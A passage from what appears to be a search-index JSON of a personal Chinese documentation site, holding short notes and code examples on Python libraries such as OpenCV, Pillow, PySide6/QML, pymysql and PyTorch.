可以用来绘制内存变化图 先执行(app,py内先要有@profile装饰器, 如上): mprof run app.py 然后会生成一个 mprofile_xxxxxxxxxxxx.dat 文件, 通过此文件画出内存变化图: mprof plot mprofile_xxxxxxxxxxxxxxxx.dat","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-memory_profiler.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-memory_profiler.html"},{"title":"numpy","text":"官网: https://numpy.org","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-numpy.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-numpy.html"},{"title":"opencv","text":"安装: pip install opencv-python 印象里多用于深度学习下的图像处理, 一般与 /docs/后端/python/python三方库/numpy 一起使用 导入: import cv2 opencv 获取的图像都是 numpy 的 ndarray 对象 对于一个长宽分别为w、h的RGB彩色图像来说，它的每个像素值是由(B、G、R)的一个tuple组成， opencv-python中每个像素三个值的顺序是(B、G、R) 读取图像-imread 显示图像-imshow 例: img = cv2.imread('img.png') cv2.imshow('image', imutils.resize(img, 800)) if cv2.waitKey(0) == 27: cv2.destroyAllWindows() 保存图像-imwrite 例: cv2.imwrite('img_1.jpg', img) # 将图像保存成jpg文件 cv2.imwrite('img_2.png', img) # 将图像保存成png文件 放置文字-putText 只能英文, 中文会乱码, 据说 opencv5.0 会解决这个问题, 截止目前尚未发布. 转换为PIL可添加中文: https://cloud.tencent.com/developer/article /2214890# 窗口销毁-destroyAllWindows/destroyWindow 图像色彩空间变换-cvtColor 图像处理时, 经常将彩色图像转化成灰度图像, 因为图像颜色会因为光照因素而产生不同变化(即变成不同颜色图片). 而图像特征提取/识别过程，需要的是图像的梯度信息，也就是图像的本质内容，所以去除颜色对梯度干扰. 可以降低数据量, 增强处理效果. 图像绘制 直线 cv2.line: 直线-line 长方形 cv2.rectangle: 长方形-rectangle 圆 cv2.circle: 圆-circle 椭圆 cv2.ellipse: 椭圆-ellipse 多边形 cv2.polylines: 多边形-polylines 公共参数： img: 表示需要进行绘制的图像对象ndarray color: 表示绘制几何图形的颜色，采用BGR即上述说的(B、G、R) thickness: 表示绘制几何图形中线的粗细，默认为1，对于圆、椭圆等封闭图像取-1时是填充图形内部 lineType: 表示绘制几何图形线的类型，默认8-connected线是光滑的，当取cv2.LINE_AA时线呈现锯齿状 直线-line 长方形-rectangle 圆-circle 椭圆-ellipse 多边形-polylines 例: pts = np.array([[10,5],[20,30],[70,20],[50,10]], np.int32) img = cv2.polylines(img,[pts],True,(0, 0, 0), 2) 对图像的简单像素操作 对图像取反: gray_img = cv2.imread('img.jpg', 0) # 加载灰度图像 reverse_img = 255 - gray_img 对图像像素线性变换: for i in range(gray_img.shape[0]): for j in range(gray_img.shape[1]): random_img[i, j] = gray_img[i, j]*1.2","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-opencv-python.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-opencv-python.html"},{"title":"outcome","text":"捕获函数运行的结果","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-outcom.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-outcom.html"},{"title":"pandas","text":"读取 CSV: read_csv()","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pandas.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pandas.html"},{"title":"pillow(PIL)","text":"安装: pip install pillow 导入: imprt PIL PIL，全称 Python Imaging Library, 图像处理库. PIL 仅支持到Python 2.7，加上年久失修，于是一群志愿者在 PIL 的基础上创建了兼容 Python 3 的版本，名字叫 Pillow ， 可以通过安装 Pillow 来使用 PIL。 打开、保存、显示图片 打开、保存、显示图片: from PIL import Image image = Image.open('img.jpg') image.show() image.save('1.jpg') print(image.mode, image.size, image.format) # RGB (481, 321) JPEG mode 为图片的模式，RGB 代表彩色图像，L 代表光照图像也即灰度图像等 size 为图片的大小(宽度，长度) format 为图片的格式，如常见的 PNG、JPEG 等 转换图片模式 转换图片模式: image.show() grey_image = image.convert('L') grey_image.show() 通道分离合并 通道分离合并: r, g, b = image.split() im = Image.merge('RGB', (b, g, r)) 彩色图像可以分离出 R、G、B 通道，但若是灰度图像，则返回灰度图像本身。然后，可以将 R、G、B 通道按照一定的顺序再合并成彩色图像。 图片裁剪、旋转和改变大小 图片裁剪、旋转和改变大小: # 对角坐标, 左上(x, y), 右下(x, y) box = (100, 100, 300, 300) region = image.crop(box) # 翻转180度 region = region.transpose(Image.ROTATE_180) image.paste(region, box) image.show() 或者: im = image.resize((300, 300)) im = image.rotate(45) # 逆时针旋转 45 度 im = image.transpose(Image.FLIP_LEFT_RIGHT) # 左右翻转 im = im.transpose(Image.FLIP_TOP_BOTTOM)# 上下翻转 像素值操作 像素值操作: out = image.point(lambda i: i * 1.2) # 对每个像素值乘以 1.2 source = image.split() out = source[0].point(lambda i: i > 128 and 255) # 对 R 通道进行二值化 和Numpy数组之间的转化 和 Numpy 数组之间的转化: array = np.array(image) print(array.shape) #(321, 481, 3) out = Image.fromarray(array) 图像缩放滤波器-Pillow库 在Pillow库中，常用的图像缩放滤波器有以下几种： Image.NEAREST: 最近邻滤波器。它选择距离缩放后位置最近的像素作为新像素值，缩放速度快但效果较差。 Image.BOX: 均值滤波器。它计算在缩放前覆盖每个输出像素的所有输入像素的平均值，并使用该平均值作为新像素值。比最近邻滤波器更平滑，但也可能导致图像失真。 Image.BILINEAR: 双线性滤波器。它通过对距离缩放后位置最近的四个像素进行加权平均来计算新像素值。比均值滤波器和最近邻滤波器更平滑，但可能会丢失一些细节。 Image.HAMMING: 汉明窗口函数滤波器。它将输入像素与一个汉明窗口函数进行卷积，以平滑图像并减少锯齿状失真。具有较高的计算复杂性，但效果很好。 Image.BICUBIC: 双三次插值滤波器。它通过在距离缩放后位置最近的16个像素上应用双三次插值来计算新像素值。比双线性滤波器更平滑，但可能会丢失一些细节。 Image.LANCZOS: 兰索斯滤波器。它通过在距离缩放后位置最近的若干个像素上应用一个基于兰索斯函数的卷积核来计算新像素值。它提供了最高的质量，但计算复杂度也最高。 每种滤波器都有其适用的场景和优缺点。 通常，如果需要快速处理大量图像，则可以使用Image.NEAREST或Image.BOX滤波器。 如果需要减少锯齿状失真并保留更多的细节，则可以使用Image.BILINEAR或Image.BICUBIC滤波器。 如果您需要最高质量的缩放，例如用于摄影或印刷品，那么可以使用Image.LANCZOS滤波器，但需要注意它的计算复杂度较高。 ps: 现在高版本使用的是 Image.Resampling.xxx , 如缩放时使用 LANCZOS 滤波器: with Image.open(img_file) as im: # 计算缩放后的图片大小 # im.convert('RGB') width, height = im.size new_width, new_height = int(width * scale), int(height * scale) size = (new_width, new_height) # 缩放图像 resized_im = im.resize(size, resample=Image.Resampling.LANCZOS)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pillow.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pillow.html"},{"title":"playwright","text":"与 /docs/后端/python/python三方库/selenium/index 类似 一个较新的自动化测试框架.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-playwright.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-playwright.html"},{"title":"pyaml","text":"提供对 yaml 格式文件的操作, 类似 json 安装: pip install pymal","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyaml.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyaml.html"},{"title":"pymysql","text":"安装: pip install pymysql 提供数据库操作: import pymysql db = pymysql.connect( host='127.0.0.1', user='user', password='password', database='database' ) cur = db.cursor() try: cur.execute('show tables;') result = cur.fetchone() print(result) cur.execute('select user();') result = cur.fetchone() print(result) db.commit() except Exception as e: db.rollback() finally: db.close()","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pymysql.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pymysql.html"},{"title":"pySerial","text":"与串口设备通信的包. 多用与嵌入式领域.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyserial.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyserial.html"},{"title":"数据可视化工具","text":"从CSV获取数据 读取CSV数据的几种方式: 直接读取 使用 csv 库: /docs/后端/python/python标准库/csv numpy: /docs/后端/python/python三方库/numpy pandas: /docs/后端/python/python三方库/pandas 以使用 pandas 为例: import argparse import pandas as pd def read_data(fname): return pd.read_csv(fname) if __name__ == \"__main__\": options = argparse.ArgumentParser() options.add_argument(\"-f\", \"--file\", type=str, required=True) args = options.parse_args() data = read_data(args.file) print(data) 数据过滤 QDateTime 设置时间 QTimeZone 设置时区 例: import argparse import pandas as pd from PySide6.QtCore import QDateTime, QTimeZone def transform_date(utc, timezone=None): utc_fmt = \"yyyy-MM-ddTHH:mm:ss.zzzZ\" new_date = QDateTime().fromString(utc, utc_fmt) if timezone: new_date.setTimeZone(timezone) return new_date def read_data(fname): # Read the CSV content df = pd.read_csv(fname) # Remove wrong magnitudes df = df.drop(df[df.mag < 0].index) magnitudes = df[\"mag\"] # My local timezone timezone = QTimeZone(b\"Europe/Berlin\") # Get timestamp transformed to our timezone times = df[\"time\"].apply(lambda x: transform_date(x, timezone)) return times, magnitudes if __name__ == \"__main__\": options = argparse.ArgumentParser() options.add_argument(\"-f\", \"--file\", type=str, required=True) args = options.parse_args() data = read_data(args.file) print(data) 使用 QMainWindow QMainWindow 是一个预定义的 GUI 主界面框架/结构: 源码: from PySide6.QtCore import Slot from PySide6.QtGui import QAction, QKeySequence from PySide6.QtWidgets import QMainWindow class MainWindow(QMainWindow): def __init__(self): QMainWindow.__init__(self) self.setWindowTitle(\"Eartquakes information\") # Menu self.menu = self.menuBar() self.file_menu = self.menu.addMenu(\"File\") # Exit QAction exit_action = QAction(\"Exit\", self) exit_action.setShortcut(QKeySequence.Quit) exit_action.triggered.connect(self.close) self.file_menu.addAction(exit_action) # Status Bar self.status = self.statusBar() self.status.showMessage(\"Data loaded and plotted\") # Window dimensions geometry = self.screen().availableGeometry() self.setFixedSize(geometry.width() * 0.8, geometry.height() * 0.7) 增加 QTableView QTableView 需要一个模型来显示数据. 可以使用 QAbstractTableModel 的实例. 注解 也可以使用更便捷的控件 QTableWidget. 相对减少代码量(不用写数据模型), 但是也降低了大数据时的性能, 不够灵活. 对于 QAbstractTableModel: headerData, 实现此方法来定义表格标题 rowCount, 表格行数 columnCount, 表格列数 例, 自定义数据类 CustomTableModel from PySide6.QtCore import Qt, QAbstractTableModel, QModelIndex from PySide6.QtGui import QColor class CustomTableModel(QAbstractTableModel): def __init__(self, data=None): QAbstractTableModel.__init__(self) self.load_data(data) def load_data(self, data): self.input_dates = data[0].values self.input_magnitudes = data[1].values self.column_count = 2 self.row_count = len(self.input_magnitudes) def rowCount(self, parent=QModelIndex()): return self.row_count def columnCount(self, parent=QModelIndex()): return self.column_count def headerData(self, section, orientation, role): if role != Qt.DisplayRole: return None if orientation == Qt.Horizontal: return (\"Date\", \"Magnitude\")[section] else: return f\"{section}\" def data(self, index, role=Qt.DisplayRole): column = index.column() row = index.row() if role == Qt.DisplayRole: if column == 0: date = self.input_dates[row].toPython() return str(date)[:-3] elif column == 1: magnitude = self.input_magnitudes[row] return f\"{magnitude:.2f}\" elif role == Qt.BackgroundRole: return QColor(Qt.white) elif role == Qt.TextAlignmentRole: return Qt.AlignRight return None 创建表格: from PySide6.QtWidgets import (QHBoxLayout, QHeaderView, QSizePolicy, QTableView, QWidget) from table_model import CustomTableModel class Widget(QWidget): def __init__(self, data): QWidget.__init__(self) # Getting the Model self.model = CustomTableModel(data) # Creating a QTableView self.table_view = QTableView() self.table_view.setModel(self.model) # QTableView Headers self.horizontal_header = self.table_view.horizontalHeader() self.vertical_header = self.table_view.verticalHeader() self.horizontal_header.setSectionResizeMode( QHeaderView.ResizeToContents ) self.vertical_header.setSectionResizeMode( QHeaderView.ResizeToContents ) self.horizontal_header.setStretchLastSection(True) # QWidget Layout self.main_layout = QHBoxLayout() size = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred) ## Left layout size.setHorizontalStretch(1) self.table_view.setSizePolicy(size) self.main_layout.addWidget(self.table_view) # Set the layout to the QWidget self.setLayout(self.main_layout) 增加图片视图 QtCharts 使用 QtCharts QChartView 注解 在 QChartView 内放置 QtCharts 设计一个空的 图表: from PySide6.QtCore import QDateTime, Qt from PySide6.QtGui import QPainter from PySide6.QtWidgets import (QWidget, QHeaderView, QHBoxLayout, QTableView, QSizePolicy) from PySide6.QtCharts import QChart, QChartView, QLineSeries, QDateTimeAxis, QValueAxis from table_model import CustomTableModel class Widget(QWidget): def __init__(self, data): QWidget.__init__(self) # Getting the Model self.model = CustomTableModel(data) # Creating a QTableView self.table_view = QTableView() self.table_view.setModel(self.model) # QTableView Headers self.horizontal_header = self.table_view.horizontalHeader() self.vertical_header = self.table_view.verticalHeader() self.horizontal_header.setSectionResizeMode(QHeaderView.ResizeToContents) self.vertical_header.setSectionResizeMode(QHeaderView.ResizeToContents) self.horizontal_header.setStretchLastSection(True) # Creating QChart self.chart = QChart() self.chart.setAnimationOptions(QChart.AllAnimations) # Creating QChartView self.chart_view = QChartView(self.chart) self.chart_view.setRenderHint(QPainter.Antialiasing) # QWidget Layout self.main_layout = QHBoxLayout() size = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred) ## Left layout size.setHorizontalStretch(1) self.table_view.setSizePolicy(size) self.main_layout.addWidget(self.table_view) ## Right Layout size.setHorizontalStretch(4) self.chart_view.setSizePolicy(size) self.main_layout.addWidget(self.chart_view) # Set the layout to the QWidget self.setLayout(self.main_layout) 绘制图表 在上一节使用 QtCharts 的基础上 根据CSV文件的数据来绘制图表 QLineSeries, 折线图 例: from PySide6.QtCore import QDateTime, Qt from PySide6.QtGui import QPainter from PySide6.QtWidgets import (QWidget, QHeaderView, QHBoxLayout, QTableView, QSizePolicy) from PySide6.QtCharts import QChart, QChartView, QLineSeries, QDateTimeAxis, QValueAxis from table_model import CustomTableModel class Widget(QWidget): def __init__(self, data): QWidget.__init__(self) # Getting the Model self.model = CustomTableModel(data) # Creating a QTableView self.table_view = QTableView() self.table_view.setModel(self.model) # QTableView Headers resize = QHeaderView.ResizeToContents self.horizontal_header = self.table_view.horizontalHeader() self.vertical_header = self.table_view.verticalHeader() self.horizontal_header.setSectionResizeMode(resize) self.vertical_header.setSectionResizeMode(resize) self.horizontal_header.setStretchLastSection(True) # Creating QChart self.chart = QChart() self.chart.setAnimationOptions(QChart.AllAnimations) self.add_series(\"Magnitude (Column 1)\", [0, 1]) # Creating QChartView self.chart_view = QChartView(self.chart) self.chart_view.setRenderHint(QPainter.Antialiasing) # QWidget Layout self.main_layout = QHBoxLayout() size = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred) # Left layout size.setHorizontalStretch(1) self.table_view.setSizePolicy(size) self.main_layout.addWidget(self.table_view) # Right Layout size.setHorizontalStretch(4) self.chart_view.setSizePolicy(size) self.main_layout.addWidget(self.chart_view) # Set the layout to the QWidget self.setLayout(self.main_layout) def add_series(self, name, columns): # Create QLineSeries self.series = QLineSeries() self.series.setName(name) # Filling QLineSeries for i in range(self.model.rowCount()): # Getting the data t = self.model.index(i, 0).data() date_fmt = \"yyyy-MM-dd HH:mm:ss.zzz\" x = QDateTime().fromString(t, date_fmt).toSecsSinceEpoch() y = float(self.model.index(i, 1).data()) if x > 0 and y > 0: self.series.append(x, y) self.chart.addSeries(self.series) # Setting X-axis self.axis_x = QDateTimeAxis() self.axis_x.setTickCount(10) self.axis_x.setFormat(\"dd.MM (h:mm)\") self.axis_x.setTitleText(\"Date\") self.chart.addAxis(self.axis_x, Qt.AlignBottom) self.series.attachAxis(self.axis_x) # Setting Y-axis self.axis_y = QValueAxis() self.axis_y.setTickCount(10) self.axis_y.setLabelFormat(\"%.2f\") self.axis_y.setTitleText(\"Magnitude\") self.chart.addAxis(self.axis_y, Qt.AlignLeft) self.series.attachAxis(self.axis_y) # Getting the color from the QChart to use it on the QTableView color_name = self.series.pen().color().name() self.model.color = f\"{color_name}\"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Data-visualization-tool.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Data-visualization-tool.html"},{"title":"工具/结构介绍","text":"PySide6项目 .ui 控件布局设计文件 .qrc 资源文件 .qmltype 控件开发相关GUI工具 Widget 开发 一般绘制前端界面时, 使用GUI工具手动绘制具有实时可见性(相对于手写py代码开发而言) 而此工具只有在手动画界面时使用. pyside6-designer, GUI界面开发工具, 生成 .ui 文件 pyside6-uic, 将 .ui 文件转换为 python 代码 pyside6-rcc, to generate serialized data from .qrc resources files. Keep in mind these files can be used in other non-widget projects. 注解 直接使用 pyside6-designer 即可启动, 而不是去安装目录下直接点开. 因为有一些环境变量的加载是必要的. 见 工具启动 QML 开发 pyside6-qmllint, 验证 .qmltype 是否存在语法错误. pyside6-qmltyperegistrar, 读取 元类型文件 并 生成包含注册这些类型为相关宏 的文件 原文: to read metatypes files and generate files that contain the necessary code to register all the types marked with relevant macros. pyside6-qmlimportscanner, 定义项目需要导入的 QML 模块, 并将结果装载为json数组. 理解可能有点问题, 原文: to identify the QML modules imported from a project/QML files and dump the result as a JSON array. 有误后面实际使用了再补充. 其他工具/指令 pyside6-assistant, 打开在线文档(Qt Help) pyside6-genpyi, 将 Qt 模块编译为 .pyi 文件. pyside6-metaobjectdump, 打印元类型信息的工具, 元类型信息从 qmltyperegistrar 生成的 JSON 中读取 pyside6-deploy, to deploy desktop applications in Linux, Windows and macOS environments. 工具启动 部分工具是直接放置到python pip安装目录下的, Windows下体现为 .exe 文件, Mac下体现为 .app . 不建议直接去安装目录下点击此文件而启动, 而是使用 pyside6- 前缀, 因为, 有部分环境变量插件等需要正确加载, 否则相关部分可能无法正常使用. 比如, Mac 安装环境下的designer是 Designer.app , 使用 pyside6-designer 来启动: (dev_venv) yanque@mbp14 project % ls /Users/yanque/project/python_venv/dev_venv/lib/python3.9/site-packages/PySide6 | grep Design Designer.app QtDesigner.abi3.so QtDesigner.pyi (dev_venv) yanque@mbp14 project % pyside6-designer Error: Qt Designer: The QWebEngineView custom widget plugin is disabled because it requires OpenGL/Software RHI (current: 6). Qt Designer: The QQuickWidget custom widget plugin is disabled because it requires OpenGL RHI (current: 6). Designer: 为类 QQuickWidget 的窗口部件注册的自定义窗口部件工厂返回 0。 ** WARNING Factory failed to create \"QQuickWidget\" Qt Designer: The QWebEngineView custom widget plugin is disabled because it requires OpenGL/Software RHI (current: 6). while executing '/Users/yanque/project/python_venv/dev_venv/lib/python3.9/site-packages/PySide6/Designer.app/Contents/MacOS/Designer'","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Project-Introduction.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Project-Introduction.html"},{"title":"QML","text":"Qt设计的一种类似 CSS, JSON 的语言, 同时允许 JavaScript , 用于创建 UI 应用 可被其他组件集成, 可被 C++ 代码使用. 相对于传统 Python 代码中编写方式而言, 使用声明式 QML 更自然, 便捷, 开发 UI 部分更快速. 在官网教程中, 标题为 Your First QtQuick/QML Application , 私以为 QtQuick 就是 QML. (待考证) 官网地址:: Your First QtQuick/QML Application 可用模块 QtQml QtQuick 结构 一个 QML 至少由两个文件组成. QML UI 描述文件 加载 QML 的 Python 代码文件 例, 一个简单的 QML 文件 view.qml import QtQuick Rectangle { id: main width: 200 height: 200 color: \"green\" Text { text: \"Hello World\" anchors.centerIn: main } } QtQuick 是一个 QML 模块. Python 加载代码 main.py import sys from PySide6.QtWidgets import QApplication from PySide6.QtQuick import QQuickView if __name__ == \"__main__\": app = QApplication() view = QQuickView() view.setSource(\"view.qml\") view.show() sys.exit(app.exec()) 运行桌面应用时, 应该在 show 之前加入更新大小的代码: view.setResizeMode(QQuickView.SizeRootObjectToView) view.show() 整合QML到Python 官网地址: Python-QML integration 其实与上面的例子基本一致. 就是多了事件的部分. 加载 QML 文件: if __name__ == '__main__': app = QGuiApplication(sys.argv) QQuickStyle.setStyle(\"Material\") engine = QQmlApplicationEngine() # Get the path of the current directory, and then add the name # of the QML file, to load it. qml_file = Path(__file__).parent / 'view.qml' engine.load(qml_file) if not engine.rootObjects(): sys.exit(-1) 只需要 QQmlApplicationEngine 来加载 QML 文件. 使用 @QmlElement 定义 QML 定义的控件相应的事件: # To be used on the @QmlElement decorator # (QML_IMPORT_MINOR_VERSION is optional) QML_IMPORT_NAME = \"io.qt.textproperties\" QML_IMPORT_MAJOR_VERSION = 1 @QmlElement class Bridge(QObject): @Slot(str, result=str) def getColor(self, s): if s.lower() == \"red\": return \"#ef9a9a\" elif s.lower() == \"green\": return \"#a5d6a7\" elif s.lower() == \"blue\": return \"#90caf9\" else: return \"white\" @Slot(float, result=int) def getSize(self, s): size = int(s * 34) if size <= 0: return 1 else: return size @Slot(str, result=bool) def getItalic(self, s): if s.lower() == \"italic\": return True else: return False @Slot(str, result=bool) def getBold(self, s): if s.lower() == \"bold\": return True else: return False 在 QML 中定义相关部分(信号与槽): Bridge { id: bridge } 比如, 点击按钮相关部分: RadioButton { id: italic Layout.alignment: Qt.AlignLeft text: \"Italic\" onToggled: { leftlabel.font.italic = bridge.getItalic(italic.text) leftlabel.font.bold = bridge.getBold(italic.text) leftlabel.font.underline = bridge.getUnderline(italic.text) } } 以下配置使用 style 触发: python main.py --style material 还可以加入 .conf 文件 qtquickcontrols2.conf [Controls] Style=Material [Universal] Theme=System Accent=Red [Material] Theme=Dark Accent=Red 加到 .qrc 文件: <!DOCTYPE RCC><RCC version=\"1.0\"> <qresource prefix=\"/\"> <file>qtquickcontrols2.conf</file> </qresource> </RCC> 生成 Python 代码: pyside6-rcc style.qrc > style_rc.py 导入到 main.py import sys from pathlib import Path from PySide6.QtCore import QObject, Slot from PySide6.QtGui import QGuiApplication from PySide6.QtQml import QQmlApplicationEngine, QmlElement from PySide6.QtQuickControls2 import QQuickStyle import style_rc 源码下载 view.qml: ../../../../../resources/code/pyside6/qml_example/view.qml main.py: ../../../../../resources/code/pyside6/qml_example/main.py 预览 : view.qml main.py 使用 QtCreator 下载: <https://download.qt.io/snapshots/qtcreator/> 注意安装的时候需要使用账户, 去 官网 注册一个账户即可. 官网使用教程: QML Application Tutorial 与数据库(SQL)结合 官网: QML, SQL and PySide Integration Tutorial 有时间按照教程试试","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-QML.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-QML.html"},{"title":"使用docker安装","text":"使用 指定版本安装 Python 并进入: docker run --name python39 -itd -p 2222:22 python:3.9 docker exec -it python39 /bin/bash # 就不换源了, 感觉三方源还不如官方源快 apt update apt install vim ssh iproute2 rsync # vim /etc/ssh/sshd_config 允许root登录 # 更新密码 passwd # 配置 pip 源 cd ~ mkdir .pip && cd .pip echo \"[global] index-url = https://pypi.douban.com/simple/ [install] trusted-host=pypi.douban.com \" >pip.conf pip install pyside6","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Use-docker-installation.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Use-docker-installation.html"},{"title":"Shiboken","text":"安装 pyside6 自带的模块 可使用其访问一些内部信息, 一般用于 debug 使用 Shiboken 创建的对象都是 Python 对象 注解 其实就是将 C++ 对象转换为可调用的 Python 对象 一些工具方法: def isValid (obj) def wrapInstance (address, type) def getCppPointer (obj) def delete (obj) def isOwnedByPython (obj) def wasCreatedByPython (obj) def dump (obj) def disassembleFrame (marker) isValid wrapInstance getCppPointer delete isOwnedByPython wasCreatedByPython dump disassembleFrame","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken.html"},{"title":"Shiboken Generator","text":"官网:: Shiboken 待补充","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken-generator.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken-generator.html"},{"title":"pystack","text":"pypi: https://pypi.org/project/pystack/ github: https://github.com/bloomberg/pystack 查看其他python进程堆栈信息 安装, 此软件依赖与底层c库, 所以对于linux, mac等, 需要提前安装依赖库, 即使没有从源码构建. mac这个库安装的时候一直找不到 elf.h, 放弃: In file included from src/pystack/_pystack.cpp:817: src/pystack/_pystack/elf_common.h:12:10: fatal error: 'elf.h' file not found #include <elf.h> &#94;~~~~~~","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pystack.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pystack.html"},{"title":"Pytest测试用例查找不到问题","text":"检查测试的函数是不是以 test_ 开头, 且 测试函数所在文件名是不是以 test_ 开头或 _test 结尾.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-common-problem-Pytest-test-case-cannot-find-the-problem.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-common-problem-Pytest-test-case-cannot-find-the-problem.html"},{"title":"API","text":"torch提供的API torch.empty() 声明一个未初始化的 Tensors 矩阵. 如创建一个 5*3 的矩阵: x = torch.empty(5, 3) torch.rand() 随机初始化一个矩阵 创建一个随机初始化的 5*3 矩阵: rand_x = torch.rand(5, 3) torch.zeros() 创建数值皆为 0 的矩阵 创建一个数值皆是 0，类型为 long 的矩阵: zero_x = torch.zeros(5, 3, dtype=torch.long) torch.ones() 创建数值皆为 1 的矩阵 torch.tensor() 直接传递 tensor 数值来创建 tensor 数值是 [5.5, 3]: tensor1 = torch.tensor([5.5, 3]) print(tensor1) 输出结果: tensor([5.5000, 3.0000]) tensor.new_ones() 除了上述几种方法，还可以根据已有的 tensor 变量创建新的 tensor 变量， 这种做法的好处就是可以保留已有 tensor 的一些属性， 包括尺寸大小、数值属性，除非是重新定义这些属性。相应的实现方法如下: tensor.new_ones() # new_*() 方法需要输入尺寸大小 如显示定义新的尺寸是 5*3，数值类型是 torch.double: tensor2 = tensor1.new_ones(5, 3, dtype=torch.double) # new_* 方法需要输入 tensor 大小 print(tensor2) 输出结果: tensor([[1., 1., 1.], [1., 1., 1.], [1., 1., 1.], [1., 1., 1.], [1., 1., 1.]], dtype=torch.float64) torch.randn_like(old_tensor) 保留相同的尺寸大小 tensor.size() torch.Size 是元组(tuple)类型，所以支持所有的元组操作 torch.add() 加法实现: torch.add(tensor1, tensor2, [out=tensor3]) tensor1.add_(tensor2) # 直接修改 tensor 变量, 有后缀 _ 或者直接: tensor3 = tensor1 + tensor2 注解 可以改变 tensor 变量的操作都带有一个后缀 _, 例如: x.copy_(y) x.t_() 都可以改变 x 变量 torch.view() 修改 tensor 尺寸 如: x = torch.randn(4, 4) y = x.view(16) # -1 表示除给定维度外的其余维度的乘积 z = x.view(-1, 8) print(x.size(), y.size(), z.size()) 输出结果: torch.Size([4, 4]) torch.Size([16]) torch.Size([2, 8]) 如果 tensor 仅有一个元素，可以采用 .item() 来获取类似 Python 中整数类型的数值: x = torch.randn(1) print(x) print(x.item()) 输出结果: tensor([0.4549]) 0.4549027979373932 torch.from_numpy(numpy_array) Numpy 数组转换为 Tensor 在 CPU 上，除了 CharTensor 外的所有 Tensor 类型变量，都支持和 Numpy数组的相互转换操作 torch.device(\"cuda\") 定义一个 CUDA 设备对象 计算平均值mean 不带参数, 表示计算所有元素平均值 dim None, 表示计算所有元素平均值 0, 表示在张量的第一个维度（列）上进行操作 1, 表示在张量的第二个维度（行）上进行操作 如: # 创建一个示例张量 x = torch.tensor([[1, 2, 3], [4, 5, 6], [7, 8, 9]], dtype=torch.float64) # 计算整个张量的平均值 mean_all = x.mean() print(mean_all) # 输出: tensor(5., dtype=torch.float64) # 沿着特定维度计算平均值 mean_dim0 = x.mean(dim=0) print(mean_dim0) # 输出: tensor([4., 5., 6.], dtype=torch.float64) mean_dim1 = x.mean(dim=1) print(mean_dim1) # 输出: tensor([2., 5., 8.], dtype=torch.float64) torch.nn torch.nn.conv2d(in_channels: int, out_channels: int, kernel_size: _size_2_t,) 卷积函数 in_channels 输入通道 out_channels 输出通道 kernel_size 卷积核大小","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-API.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-API.html"},{"title":"实例-训练分类器","text":"训练数据 在训练分类器前，当然需要考虑数据的问题。 通常在处理如图片、文本、语音或者视频数据的时候， 一般都采用标准的 Python 库将其加载并转成 Numpy 数组，然后再转回为 PyTorch 的张量。 对于图像，可以采用 Pillow, OpenCV 库； 对于语音，有 scipy 和 librosa; 对于文本，可以选择原生 Python 或者 Cython 进行加载数据，或者使用 NLTK 和 SpaCy 。 PyTorch 对于计算机视觉，特别创建了一个 torchvision 的库， 它包含一个数据加载器(data loader)，可以加载比较常见的数据集， 比如 Imagenet, CIFAR10, MNIST 等等，然后还有一个用于图像的数据转换器(data transformers)， 调用的库是 torchvision.datasets 和 torch.utils.data.DataLoader 。 在本教程中，将采用 CIFAR10 数据集，它包含 10 个类别，分别是飞机、汽车、鸟、猫、鹿、狗、青蛙、马、船和卡车。数据集中的图片都是 3x32x32。一些例子如下所示： 数据并行 在 GPU 上训练模型的做法很简单，如下代码所示，定义一个 device 对象， 然后用 .to() 方法将网络模型参数放到指定的 GPU 上: device = torch.device(\"cuda:0\") model.to(device) 接着就是将所有的张量变量放到 GPU 上: mytensor = my_tensor.to(device) 注解 这里 